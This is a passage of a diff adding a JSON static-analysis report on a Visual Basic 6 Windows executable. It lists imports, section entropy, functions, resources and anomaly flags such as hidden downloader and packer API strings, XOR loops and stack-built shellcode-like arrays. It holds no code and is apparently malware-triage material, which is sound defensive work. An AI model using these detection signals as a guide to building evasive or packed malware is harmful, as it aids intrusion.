+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 4528,
+          "name": "msvbvm60.rtcLeftCharVar",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4532,
+          "name": "msvbvm60._CIatan",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4536,
+          "name": "msvbvm60.__vbaUI1Str",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4540,
+          "name": "msvbvm60.__vbaAryCopy",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4544,
+          "name": "msvbvm60.__vbaStrMove",
+          "type": "IMPORT",
+          "num_refs": 34
+        },
+        {
+          "ea": 4548,
+          "name": "msvbvm60.rtcRightCharVar",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4552,
+          "name": "msvbvm60.__vbaForEachVar",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4556,
+          "name": "msvbvm60._allmul",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4560,
+          "name": "msvbvm60._CItan",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4564,
+          "name": "msvbvm60.__vbaFPInt",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4568,
+          "name": "msvbvm60.__vbaAryUnlock",
+          "type": "IMPORT",
+          "num_refs": 19
+        },
+        {
+          "ea": 4572,
+          "name": "msvbvm60.__vbaVarForNext",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4576,
+          "name": "msvbvm60._CIexp",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4580,
+          "name": "msvbvm60.__vbaFreeObj",
+          "type": "IMPORT",
+          "num_refs": 9
+        },
+        {
+          "ea": 4584,
+          "name": "msvbvm60.__vbaI4ErrVar",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4588,
+          "name": "msvbvm60.__vbaFreeStr",
+          "type": "IMPORT",
+          "num_refs": 34
+        },
+        {
+          "ea": 12284,
+          "name": "advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 12308,
+          "name": "dllfunccall_advapi32.dll:ConvertStringSecurityDescriptorToSecurityDescriptorA",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 12364,
+          "name": "advapi32.SetKernelObjectSecurity",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 12388,
+          "name": "dllfunccall_advapi32.dll:SetKernelObjectSecurity",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 12480,
+          "name": "USER32.CallWindowProcA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 12504,
+          "name": "dllfunccall_USER32:CallWindowProcA",
+          "type": "DEBUG",
+          "num_refs": 1
+        }
+      ],
+      "sections": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 4096,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 15
+        },
+        {
+          "name": ".text",
+          "effective_address": 4096,
+          "physical_size": 53248,
+          "virtual_size": 53248,
+          "rights": "RX",
+          "entropy": 103
+        },
+        {
+          "name": ".data",
+          "effective_address": 57344,
+          "physical_size": 4096,
+          "virtual_size": 8192,
+          "rights": "RW",
+          "entropy": 4
+        },
+        {
+          "name": ".rsrc",
+          "effective_address": 65536,
+          "physical_size": 466944,
+          "virtual_size": 466944,
+          "rights": "R",
+          "entropy": 141
+        },
+        {
+          "name": "overlay",
+          "effective_address": 532480,
+          "physical_size": 4670,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 121
+        }
+      ],
+      "entropy": {
+        "file_entropy": 135,
+        "regions": [
+          {
+            "name": "header",
+            "entropy": 15,
+            "size": null
+          },
+          {
+            "name": ".text",
+            "entropy": 103,
+            "size": null
+          },
+          {
+            "name": ".data",
+            "entropy": 4,
+            "size": null
+          },
+          {
+            "name": ".rsrc",
+            "entropy": 141,
+            "size": null
+          },
+          {
+            "name": "overlay",
+            "entropy": 121,
+            "size": null
+          }
+        ]
+      },
+      "functions": [
+        {
+          "ea": 36224,
+          "name": "sub_408d80"
+        },
+        {
+          "ea": 21296,
+          "name": "sub_405330"
+        },
+        {
+          "ea": 41900,
+          "name": "sub_40a3ac"
+        },
+        {
+          "ea": 37760,
+          "name": "sub_409380"
+        },
+        {
+          "ea": 47104,
+          "name": "sub_40b800"
+        },
+        {
+          "ea": 48544,
+          "name": "sub_40bda0"
+        },
+        {
+          "ea": 24400,
+          "name": "sub_405f50"
+        },
+        {
+          "ea": 22702,
+          "name": "sub_4058ae"
+        },
+        {
+          "ea": 51568,
+          "name": "sub_40c970"
+        },
+        {
+          "ea": 32576,
+          "name": "sub_407f40"
+        },
+        {
+          "ea": 29056,
+          "name": "sub_407180"
+        },
+        {
+          "ea": 23744,
+          "name": "sub_405cc0"
+        },
+        {
+          "ea": 29664,
+          "name": "sub_4073e0"
+        },
+        {
+          "ea": 33456,
+          "name": "sub_4082b0"
+        },
+        {
+          "ea": 30752,
+          "name": "sub_407820"
+        },
+        {
+          "ea": 34816,
+          "name": "sub_408800"
+        },
+        {
+          "ea": 34064,
+          "name": "sub_408510"
+        },
+        {
+          "ea": 50048,
+          "name": "sub_40c380"
+        },
+        {
+          "ea": 34530,
+          "name": "sub_4086e2"
+        },
+        {
+          "ea": 46656,
+          "name": "sub_40b640"
+        },
+        {
+          "ea": 33192,
+          "name": "sub_4081a8"
+        },
+        {
+          "ea": 28255,
+          "name": "sub_406e5f"
+        },
+        {
+          "ea": 32170,
+          "name": "sub_407daa"
+        },
+        {
+          "ea": 28640,
+          "name": "sub_406fe0"
+        },
+        {
+          "ea": 31973,
+          "name": "sub_407ce5"
+        },
+        {
+          "ea": 30539,
+          "name": "sub_40774b"
+        },
+        {
+          "ea": 33963,
+          "name": "sub_4084ab"
+        },
+        {
+          "ea": 34452,
+          "name": "sub_408694"
+        },
+        {
+          "ea": 36126,
+          "name": "sub_408d1e"
+        },
+        {
+          "ea": 23584,
+          "name": "sub_405c20"
+        }
+      ],
+      "constants": [
+        {
+          "id": "registry::HKEY_LOCAL_MACHINE",
+          "category": "registry",
+          "type": "code",
+          "num_hits": 2
+        }
+      ],
+      "carved": [
+        {
+          "ea": 19932,
+          "offset": 19932,
+          "size": 744,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 20676,
+          "offset": 20676,
+          "size": 296,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 66320,
+          "offset": 62224,
+          "size": 1736,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 68056,
+          "offset": 63960,
+          "size": 1864,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 69920,
+          "offset": 65824,
+          "size": 2216,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 72136,
+          "offset": 68040,
+          "size": 3240,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 75376,
+          "offset": 71280,
+          "size": 1128,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 76504,
+          "offset": 72408,
+          "size": 2440,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 78944,
+          "offset": 74848,
+          "size": 4264,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 83208,
+          "offset": 79112,
+          "size": 9640,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 92848,
+          "offset": 88752,
+          "size": 744,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        },
+        {
+          "ea": 93592,
+          "offset": 89496,
+          "size": 296,
+          "type": "DIB",
+          "type_category": "IMAGE"
+        }
+      ],
+      "virtual_files": [
+        {
+          "path": "ICO/1/unk",
+          "unpacked_size": 1736
+        },
+        {
+          "path": "ICO/2/unk",
+          "unpacked_size": 1864
+        },
+        {
+          "path": "ICO/3/unk",
+          "unpacked_size": 2216
+        },
+        {
+          "path": "ICO/4/unk",
+          "unpacked_size": 3240
+        },
+        {
+          "path": "ICO/5/unk",
+          "unpacked_size": 1128
+        },
+        {
+          "path": "ICO/6/unk",
+          "unpacked_size": 2440
+        },
+        {
+          "path": "ICO/7/unk",
+          "unpacked_size": 4264
+        },
+        {
+          "path": "ICO/8/unk",
+          "unpacked_size": 9640
+        },
+        {
+          "path": "ICO/30001/unk",
+          "unpacked_size": 744
+        },
+        {
+          "path": "ICO/30002/unk",
+          "unpacked_size": 296
+        },
+        {
+          "path": "GRPICO/1/unk",
+          "unpacked_size": 118
+        },
+        {
+          "path": "VER/1/en-us",
+          "unpacked_size": 1500
+        },
+        {
+          "path": "32/4000/en-us",
+          "unpacked_size": 434186
+        },
+        {
+          "path": "32/5000/en-us",
+          "unpacked_size": 752
+        }
+      ],
+      "structures": [
+        {
+          "name": "MZ",
+          "ea": 0
+        },
+        {
+          "name": "RichHeader",
+          "ea": 128
+        },
+        {
+          "name": "PE",
+          "ea": 192
+        },
+        {
+          "name": "OptionalHeader",
+          "ea": 216
+        },
+        {
+          "name": "Sections",
+          "ea": 440
+        },
+        {
+          "name": "BoundImportTable",
+          "ea": 560
+        },
+        {
+          "name": "BoundImportNames",
+          "ea": 600
+        },
+        {
+          "name": "kernel32.FT",
+          "ea": 4096
+        },
+        {
+          "name": "user32.FT",
+          "ea": 4112
+        },
+        {
+          "name": "msvbvm60.FT",
+          "ea": 4120
+        },
+        {
+          "name": "VBExternalTable",
+          "ea": 6220
+        },
+        {
+          "name": "VBObj.Module1",
+          "ea": 6252
+        },
+        {
+          "name": "VBObj.Module14",
+          "ea": 6308
+        },
+        {
+          "name": "VBObj.Module2",
+          "ea": 6364
+        },
+        {
+          "name": "VBObj.Module3",
+          "ea": 6420
+        },
+        {
+          "name": "VBObj.Module4",
+          "ea": 6476
+        },
+        {
+          "name": "VBObj.Module13",
+          "ea": 6532
+        },
+        {
+          "name": "VBObj.Module6",
+          "ea": 6588
+        },
+        {
+          "name": "VBObj.Module5",
+          "ea": 6644
+        },
+        {
+          "name": "VBObj.Module9",
+          "ea": 6700
+        },
+        {
+          "name": "VBObj.Module10",
+          "ea": 6756
+        },
+        {
+          "name": "VBObj.Module11",
+          "ea": 6812
+        },
+        {
+          "name": "VBObj.Module12",
+          "ea": 6868
+        },
+        {
+          "name": "VBObj.Module8",
+          "ea": 6924
+        },
+        {
+          "name": "VBObj.Module8.Methods",
+          "ea": 6980
+        },
+        {
+          "name": "VBObj.Module7",
+          "ea": 6984
+        },
+        {
+          "name": "VBObj.Module7.Methods",
+          "ea": 7040
+        },
+        {
+          "name": "VBHeader",
+          "ea": 7048
+        },
+        {
+          "name": "VBForms",
+          "ea": 7196
+        },
+        {
+          "name": "VBObj.Form1",
+          "ea": 7356
+        },
+        {
+          "name": "VBObj.Form1.OptInfos",
+          "ea": 7412
+        },
+        {
+          "name": "VBObj.Form1.Controls",
+          "ea": 7484
+        },
+        {
+          "name": "VBObj.Form1.Controls.Form.Events",
+          "ea": 7524
+        },
+        {
+          "name": "VBObj.Form3",
+          "ea": 7672
+        },
+        {
+          "name": "VBObj.Form3.OptInfos",
+          "ea": 7728
+        },
+        {
+          "name": "VBObj.Form3.Controls",
+          "ea": 7800
+        },
+        {
+          "name": "VBObj.Form3.Controls.Form.Events",
+          "ea": 7840
+        },
+        {
+          "name": "VBProjectInfo",
+          "ea": 8316
+        },
+        {
+          "name": "VBObjectTable",
+          "ea": 8888
+        },
+        {
+          "name": "VBObjectArray",
+          "ea": 8972
+        },
+        {
+          "name": "VBExternalApi",
+          "ea": 12284
+        },
+        {
+          "name": "VBExternalApi",
+          "ea": 12364
+        },
+        {
+          "name": "VBExternalApi",
+          "ea": 12480
+        },
+        {
+          "name": "VBForm.1",
+          "ea": 19440
+        },
+        {
+          "name": "VBForm.0",
+          "ea": 19760
+        },
+        {
+          "name": "ImportTable",
+          "ea": 52228
+        },
+        {
+          "name": "kernel32.OFT",
+          "ea": 52308
+        },
+        {
+          "name": "user32.OFT",
+          "ea": 52324
+        },
+        {
+          "name": "msvbvm60.OFT",
+          "ea": 52332
+        },
+        {
+          "name": "ImportNames",
+          "ea": 52808
+        },
+        {
+          "name": "Resources",
+          "ea": 65536
+        },
+        {
+          "name": "Resources.ICO",
+          "ea": 65584
+        },
+        {
+          "name": "Resources.GRPICO",
+          "ea": 65680
+        },
+        {
+          "name": "Resources.VER",
+          "ea": 65704
+        },
+        {
+          "name": "Resources.32",
+          "ea": 65728
+        },
+        {
+          "name": "Resources.ICO.1",
+          "ea": 65760
+        },
+        {
+          "name": "Resources.ICO.2",
+          "ea": 65784
+        },
+        {
+          "name": "Resources.ICO.3",
+          "ea": 65808
+        },
+        {
+          "name": "Resources.ICO.4",
+          "ea": 65832
+        },
+        {
+          "name": "Resources.ICO.5",
+          "ea": 65856
+        },
+        {
+          "name": "Resources.ICO.6",
+          "ea": 65880
+        },
+        {
+          "name": "Resources.ICO.7",
+          "ea": 65904
+        },
+        {
+          "name": "Resources.ICO.8",
+          "ea": 65928
+        },
+        {
+          "name": "Resources.ICO.30001",
+          "ea": 65952
+        },
+        {
+          "name": "Resources.ICO.30002",
+          "ea": 65976
+        },
+        {
+          "name": "Resources.GRPICO.1",
+          "ea": 66000
+        },
+        {
+          "name": "Resources.VER.1",
+          "ea": 66024
+        },
+        {
+          "name": "Resources.32.4000",
+          "ea": 66048
+        },
+        {
+          "name": "Resources.32.5000",
+          "ea": 66072
+        },
+        {
+          "name": "Resources.ICO.1.unk",
+          "ea": 66096
+        },
+        {
+          "name": "Resources.ICO.2.unk",
+          "ea": 66112
+        },
+        {
+          "name": "Resources.ICO.3.unk",
+          "ea": 66128
+        },
+        {
+          "name": "Resources.ICO.4.unk",
+          "ea": 66144
+        },
+        {
+          "name": "Resources.ICO.5.unk",
+          "ea": 66160
+        },
+        {
+          "name": "Resources.ICO.6.unk",
+          "ea": 66176
+        },
+        {
+          "name": "Resources.ICO.7.unk",
+          "ea": 66192
+        },
+        {
+          "name": "Resources.ICO.8.unk",
+          "ea": 66208
+        },
+        {
+          "name": "Resources.ICO.30001.unk",
+          "ea": 66224
+        },
+        {
+          "name": "Resources.ICO.30002.unk",
+          "ea": 66240
+        },
+        {
+          "name": "Resources.GRPICO.1.unk",
+          "ea": 66256
+        },
+        {
+          "name": "Resources.VER.1.en-us",
+          "ea": 66272
+        },
+        {
+          "name": "Resources.32.4000.en-us",
+          "ea": 66288
+        },
+        {
+          "name": "Resources.32.5000.en-us",
+          "ea": 66304
+        },
+        {
+          "name": "Resources.ICO.1.unk.Data",
+          "ea": 66320
+        },
+        {
+          "name": "Resources.ICO.2.unk.Data",
+          "ea": 68056
+        },
+        {
+          "name": "Resources.ICO.3.unk.Data",
+          "ea": 69920
+        },
+        {
+          "name": "Resources.ICO.4.unk.Data",
+          "ea": 72136
+        },
+        {
+          "name": "Resources.ICO.5.unk.Data",
+          "ea": 75376
+        },
+        {
+          "name": "Resources.ICO.6.unk.Data",
+          "ea": 76504
+        },
+        {
+          "name": "Resources.ICO.7.unk.Data",
+          "ea": 78944
+        },
+        {
+          "name": "Resources.ICO.8.unk.Data",
+          "ea": 83208
+        },
+        {
+          "name": "Resources.ICO.30001.unk.Data",
+          "ea": 92848
+        },
+        {
+          "name": "Resources.ICO.30002.unk.Data",
+          "ea": 93592
+        },
+        {
+          "name": "Resources.GRPICO.1.unk.Data",
+          "ea": 93888
+        },
+        {
+          "name": "VersionInfo",
+          "ea": 94008
+        },
+        {
+          "name": "VersionInfo.Overlay",
+          "ea": 94756
+        },
+        {
+          "name": "Resources.32.4000.en-us.Data",
+          "ea": 95508
+        },
+        {
+          "name": "Resources.32.5000.en-us.Data",
+          "ea": 529696
+        }
+      ]
+    },
+    "functions": [
+      {
+        "ea": 36224,
+        "name": "sub_408d80"
+      },
+      {
+        "ea": 21296,
+        "name": "sub_405330"
+      },
+      {
+        "ea": 41900,
+        "name": "sub_40a3ac"
+      },
+      {
+        "ea": 37760,
+        "name": "sub_409380"
+      },
+      {
+        "ea": 47104,
+        "name": "sub_40b800"
+      },
+      {
+        "ea": 48544,
+        "name": "sub_40bda0"
+      },
+      {
+        "ea": 24400,
+        "name": "sub_405f50"
+      },
+      {
+        "ea": 22702,
+        "name": "sub_4058ae"
+      },
+      {
+        "ea": 51568,
+        "name": "sub_40c970"
+      },
+      {
+        "ea": 32576,
+        "name": "sub_407f40"
+      },
+      {
+        "ea": 29056,
+        "name": "sub_407180"
+      },
+      {
+        "ea": 23744,
+        "name": "sub_405cc0"
+      },
+      {
+        "ea": 29664,
+        "name": "sub_4073e0"
+      },
+      {
+        "ea": 33456,
+        "name": "sub_4082b0"
+      },
+      {
+        "ea": 30752,
+        "name": "sub_407820"
+      },
+      {
+        "ea": 34816,
+        "name": "sub_408800"
+      },
+      {
+        "ea": 34064,
+        "name": "sub_408510"
+      },
+      {
+        "ea": 50048,
+        "name": "sub_40c380"
+      },
+      {
+        "ea": 34530,
+        "name": "sub_4086e2"
+      },
+      {
+        "ea": 46656,
+        "name": "sub_40b640"
+      },
+      {
+        "ea": 33192,
+        "name": "sub_4081a8"
+      },
+      {
+        "ea": 28255,
+        "name": "sub_406e5f"
+      },
+      {
+        "ea": 32170,
+        "name": "sub_407daa"
+      },
+      {
+        "ea": 28640,
+        "name": "sub_406fe0"
+      },
+      {
+        "ea": 31973,
+        "name": "sub_407ce5"
+      },
+      {
+        "ea": 30539,
+        "name": "sub_40774b"
+      },
+      {
+        "ea": 33963,
+        "name": "sub_4084ab"
+      },
+      {
+        "ea": 34452,
+        "name": "sub_408694"
+      },
+      {
+        "ea": 36126,
+        "name": "sub_408d1e"
+      },
+      {
+        "ea": 23584,
+        "name": "sub_405c20"
+      }
+    ],
+    "constants": [
+      {
+        "id": "registry::HKEY_LOCAL_MACHINE",
+        "category": "registry",
+        "type": "code",
+        "num_hits": 2
+      }
+    ],
+    "anomalies": [
+      {
+        "name": "BoundImports",
+        "desc": "Bound imports are present",
+        "category": "imports",
+        "level": 2,
+        "num_hits": 1
+      },
+      {
+        "name": "InvalidChecksum",
+        "desc": "PE Header checksum is wrong",
+        "category": "integrity",
+        "level": 4,
+        "num_hits": 1
+      },
+      {
+        "name": "PossibleDownloaderApiDynamicImport",
+        "desc": "A downloader-related api (recv, InternetConnect, etc.) is present as string in the binary, but is not imported",
+        "category": "imports",
+        "level": 4,
+        "num_hits": 1
+      },
+      {
+        "name": "PossiblePackerApiDynamicImport",
+        "desc": "A packer-related api (VirtualProtect, ResumeThread, etc.) is present as string in the binary, but is not imported",
+        "category": "imports",
+        "level": 4,
+        "num_hits": 5
+      },
+      {
+        "name": "StackArrayInitialisationX86",
+        "desc": "An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings",
+        "category": "code",
+        "level": 3,
+        "num_hits": 4
+      },
+      {
+        "name": "UnknownOverlayMediumToHighEntropy",
+        "desc": "File contains an overlay which is not of known type and has medium-to-high entropy",
+        "category": "entropy",
+        "level": 3,
+        "num_hits": 1
+      },
+      {
+        "name": "UnknownRootResourceDirectoryId",
+        "desc": "A root resource directory ID is not standard",
+        "category": "resources",
+        "level": 4,
+        "num_hits": 1
+      },
+      {
+        "name": "UnparsedVersionInfo",
+        "desc": "Version informations were not fully parsed",
+        "category": "resources",
+        "level": 4,
+        "num_hits": 1
+      },
+      {
+        "name": "VBExternalApi",
+        "desc": "VB project uses external Win32 APIs (most likely via DllFunctionCall)",
+        "category": "imports",
+        "level": 3,
+        "num_hits": 3
+      },
+      {
+        "name": "XorInLoop",
+        "desc": "XOR instruction in a loop",
+        "category": "code",
+        "level": 3,
+        "num_hits": 2
+      }
+    ],
+    "carved_files": [
+      {
+        "ea": 19932,
+        "offset": 19932,
+        "size": 744,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 20676,
+        "offset": 20676,
+        "size": 296,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 66320,
+        "offset": 62224,
+        "size": 1736,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 68056,
+        "offset": 63960,
+        "size": 1864,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 69920,
+        "offset": 65824,
+        "size": 2216,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 72136,
+        "offset": 68040,
+        "size": 3240,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 75376,
+        "offset": 71280,
+        "size": 1128,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 76504,
+        "offset": 72408,
+        "size": 2440,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 78944,
+        "offset": 74848,
+        "size": 4264,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 83208,
+        "offset": 79112,
+        "size": 9640,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 92848,
+        "offset": 88752,
+        "size": 744,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      },
+      {
+        "ea": 93592,
+        "offset": 89496,
+        "size": 296,
+        "type": "DIB",
+        "type_category": "IMAGE"
+      }
+    ],
+    "virtual_files": [
+      {
+        "path": "ICO/1/unk",
+        "unpacked_size": 1736
+      },
+      {
+        "path": "ICO/2/unk",
+        "unpacked_size": 1864
+      },
+      {
+        "path": "ICO/3/unk",
+        "unpacked_size": 2216
+      },
+      {
+        "path": "ICO/4/unk",
+        "unpacked_size": 3240
+      },
+      {
+        "path": "ICO/5/unk",
+        "unpacked_size": 1128
+      },
+      {
+        "path": "ICO/6/unk",
+        "unpacked_size": 2440
+      },
+      {
+        "path": "ICO/7/unk",
+        "unpacked_size": 4264
+      },
+      {
+        "path": "ICO/8/unk",
+        "unpacked_size": 9640
+      },
+      {
+        "path": "ICO/30001/unk",
+        "unpacked_size": 744
+      },
+      {
+        "path": "ICO/30002/unk",
+        "unpacked_size": 296
+      },
+      {
+        "path": "GRPICO/1/unk",
+        "unpacked_size": 118
+      },
+      {
+        "path": "VER/1/en-us",
+        "unpacked_size": 1500
+      },
+      {
+        "path": "32/4000/en-us",
+        "unpacked_size": 434186
+      },
+      {
+        "path": "32/5000/en-us",
+        "unpacked_size": 752
+      }
+    ],
+    "structures": [
+      {
+        "name": "MZ",
+        "ea": 0
+      },
+      {
+        "name": "RichHeader",
+        "ea": 128
+      },
+      {
+        "name": "PE",
+        "ea": 192
+      },
+      {
+        "name": "OptionalHeader",
+        "ea": 216
+      },
+      {
+        "name": "Sections",
+        "ea": 440
+      },
+      {
+        "name": "BoundImportTable",
+        "ea": 560
+      },
+      {
+        "name": "BoundImportNames",
+        "ea": 600
+      },
+      {
+        "name": "kernel32.FT",
+        "ea": 4096
+      },
+      {
+        "name": "user32.FT",
+        "ea": 4112
+      },
+      {
+        "name": "msvbvm60.FT",
+        "ea": 4120
+      },
+      {
+        "name": "VBExternalTable",
+        "ea": 6220
+      },
+      {
+        "name": "VBObj.Module1",
+        "ea": 6252
+      },
+      {
+        "name": "VBObj.Module14",
+        "ea": 6308
+      },
+      {
+        "name": "VBObj.Module2",
+        "ea": 6364
+      },
+      {
+        "name": "VBObj.Module3",
+        "ea": 6420
+      },
+      {
+        "name": "VBObj.Module4",
+        "ea": 6476
+      },
+      {
+        "name": "VBObj.Module13",
+        "ea": 6532
+      },
+      {
+        "name": "VBObj.Module6",
+        "ea": 6588
+      },
+      {
+        "name": "VBObj.Module5",
+        "ea": 6644
+      },
+      {
+        "name": "VBObj.Module9",
+        "ea": 6700
+      },
+      {
+        "name": "VBObj.Module10",
+        "ea": 6756
+      },
+      {
+        "name": "VBObj.Module11",
+        "ea": 6812
+      },
+      {
+        "name": "VBObj.Module12",
+        "ea": 6868
+      },
+      {
+        "name": "VBObj.Module8",
+        "ea": 6924
+      },
+      {
+        "name": "VBObj.Module8.Methods",
+        "ea": 6980
+      },
+      {
+        "name": "VBObj.Module7",
+        "ea": 6984
+      },
+      {
+        "name": "VBObj.Module7.Methods",
+        "ea": 7040
+      },
+      {
+        "name": "VBHeader",
+        "ea": 7048
+      },
+      {
+        "name": "VBForms",
+        "ea": 7196
+      },
+      {
+        "name": "VBObj.Form1",
+        "ea": 7356
+      },
+      {
+        "name": "VBObj.Form1.OptInfos",
+        "ea": 7412
+      },
+      {
+        "name": "VBObj.Form1.Controls",
+        "ea": 7484
+      },
+      {
+        "name": "VBObj.Form1.Controls.Form.Events",
+        "ea": 7524
+      },
+      {
+        "name": "VBObj.Form3",
+        "ea": 7672
+      },
+      {
+        "name": "VBObj.Form3.OptInfos",
+        "ea": 7728
+      },
+      {
+        "name": "VBObj.Form3.Controls",
+        "ea": 7800
+      },
+      {
+        "name": "VBObj.Form3.Controls.Form.Events",
+        "ea": 7840
+      },
+      {
+        "name": "VBProjectInfo",
+        "ea": 8316
+      },
+      {
+        "name": "VBObjectTable",
+        "ea": 8888
+      },
+      {
+        "name": "VBObjectArray",
+        "ea": 8972
+      },
+      {
+        "name": "VBExternalApi",
+        "ea": 12284
+      },
+      {
+        "name": "VBExternalApi",
+        "ea": 12364
+      },
+      {
+        "name": "VBExternalApi",
+        "ea": 12480
+      },
+      {
+        "name": "VBForm.1",
+        "ea": 19440
+      },
+      {
+        "name": "VBForm.0",
+        "ea": 19760
+      },
+      {
+        "name": "ImportTable",
+        "ea": 52228
+      },
+      {
+        "name": "kernel32.OFT",
+        "ea": 52308
+      },
+      {
+        "name": "user32.OFT",
+        "ea": 52324
+      },
+      {
+        "name": "msvbvm60.OFT",
+        "ea": 52332
+      },
+      {
+        "name": "ImportNames",
+        "ea": 52808
+      },
+      {
+        "name": "Resources",
+        "ea": 65536
+      },
+      {
+        "name": "Resources.ICO",
+        "ea": 65584
+      },
+      {
+        "name": "Resources.GRPICO",
+        "ea": 65680
+      },
+      {
+        "name": "Resources.VER",
+        "ea": 65704
+      },
+      {
+        "name": "Resources.32",
+        "ea": 65728
+      },
+      {
+        "name": "Resources.ICO.1",
+        "ea": 65760
+      },
+      {
+        "name": "Resources.ICO.2",
+        "ea": 65784
+      },
+      {
+        "name": "Resources.ICO.3",
+        "ea": 65808
+      },
+      {
+        "name": "Resources.ICO.4",
+        "ea": 65832
+      },
+      {
+        "name": "Resources.ICO.5",
+        "ea": 65856
+      },
+      {
+        "name": "Resources.ICO.6",
+        "ea": 65880
+      },
+      {
+        "name": "Resources.ICO.7",
+        "ea": 65904
+      },
+      {
+        "name": "Resources.ICO.8",
+        "ea": 65928
+      },
+      {
+        "name": "Resources.ICO.30001",
+        "ea": 65952
+      },
+      {
+        "name": "Resources.ICO.30002",
+        "ea": 65976
+      },
+      {
+        "name": "Resources.GRPICO.1",
+        "ea": 66000
+      },
+      {
+        "name": "Resources.VER.1",
+        "ea": 66024
+      },
+      {
+        "name": "Resources.32.4000",
+        "ea": 66048
+      },
+      {
+        "name": "Resources.32.5000",
+        "ea": 66072
+      },
+      {
+        "name": "Resources.ICO.1.unk",
+        "ea": 66096
+      },
+      {
+        "name": "Resources.ICO.2.unk",
+        "ea": 66112
+      },
+      {
+        "name": "Resources.ICO.3.unk",
+        "ea": 66128
+      },
+      {
+        "name": "Resources.ICO.4.unk",
+        "ea": 66144
+      },
+      {
+        "name": "Resources.ICO.5.unk",
+        "ea": 66160
+      },
+      {
+        "name": "Resources.ICO.6.unk",
+        "ea": 66176
+      },
+      {
+        "name": "Resources.ICO.7.unk",
+        "ea": 66192
+      },
+      {
+        "name": "Resources.ICO.8.unk",
+        "ea": 66208
+      },
+      {
+        "name": "Resources.ICO.30001.unk",
+        "ea": 66224
+      },
+      {
+        "name": "Resources.ICO.30002.unk",
+        "ea": 66240
+      },
+      {
+        "name": "Resources.GRPICO.1.unk",
+        "ea": 66256
+      },
+      {
+        "name": "Resources.VER.1.en-us",
+        "ea": 66272
+      },
+      {
+        "name": "Resources.32.4000.en-us",
+        "ea": 66288
+      },
+      {
+        "name": "Resources.32.5000.en-us",
+        "ea": 66304
+      },
+      {
+        "name": "Resources.ICO.1.unk.Data",
+        "ea": 66320
+      },
+      {
+        "name": "Resources.ICO.2.unk.Data",
+        "ea": 68056
+      },
+      {
+        "name": "Resources.ICO.3.unk.Data",
+        "ea": 69920
+      },
+      {
+        "name": "Resources.ICO.4.unk.Data",
+        "ea": 72136
+      },
+      {
+        "name": "Resources.ICO.5.unk.Data",
+        "ea": 75376
+      },
+      {
+        "name": "Resources.ICO.6.unk.Data",
+        "ea": 76504
+      },
+      {
+        "name": "Resources.ICO.7.unk.Data",
+        "ea": 78944
+      },
+      {
+        "name": "Resources.ICO.8.unk.Data",
+        "ea": 83208
+      },
+      {
+        "name": "Resources.ICO.30001.unk.Data",
+        "ea": 92848
+      },
+      {
+        "name": "Resources.ICO.30002.unk.Data",
+        "ea": 93592
+      },
+      {
+        "name": "Resources.GRPICO.1.unk.Data",
+        "ea": 93888
+      },
+      {
+        "name": "VersionInfo",
+        "ea": 94008
+      },
+      {
+        "name": "VersionInfo.Overlay",
+        "ea": 94756
+      },
+      {
+        "name": "Resources.32.4000.en-us.Data",
+        "ea": 95508
+      },
+      {
+        "name": "Resources.32.5000.en-us.Data",
+        "ea": 529696
+      }
+    ],
+    "decompilations": {
+      "36224": {
+        "name": "sub_408d80",
